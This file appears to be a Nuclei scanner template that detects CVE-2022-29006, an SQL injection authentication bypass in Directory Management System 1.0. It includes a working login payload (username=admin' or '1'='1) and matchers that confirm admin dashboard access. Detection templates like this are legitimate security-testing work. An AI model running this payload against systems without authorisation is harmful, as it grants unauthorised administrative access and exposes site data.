id: CVE-2022-29006
info:
  name: Directory Management System 1.0 - SQL Injection
  author: TenBird
  severity: critical
  description: The Directory Management System 1.0 has SQL injection vulnerabilities
    that allow attackers to obtain sensitive information, modify data, and perform
    unauthorized administrative operations using compromised username and password
    parameters in the Admin panel.
  reference:
  - https://www.exploit-db.com/exploits/50370
  - https://phpgurukul.com/directory-management-system-using-php-and-mysql/
  - https://nvd.nist.gov/vuln/detail/CVE-2022-29006
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-29006
    cwe-id: CWE-89
  metadata:
    verified: 'true'
    impact: The SQL injection vulnerabilities in Directory Management System 1.0 can
      lead to unauthorized access and manipulation of sensitive information, posing
      a significant impact on the security and integrity of the affected sites.
    recommendation: It is recommended to patch the Directory Management System 1.0
      to address the SQL injection vulnerabilities present in the Admin panel, in
      order to prevent unauthorized access and data manipulation by attackers.
  tags: cve,cve2022,sqli,auth-bypass,edb
requests:
- raw:
  - 'POST /admin/index.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8


    username=admin'' or ''1''=''1&password=1&login=login

    '
  - 'GET /admin/dashboard.php HTTP/1.1

    Host: {{Hostname}}

    '
  cookie-reuse: true
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - DMS || Dashboard
    - DMS Admin
    - Admin Profile
    condition: and
  - type: status
    status:
    - 200
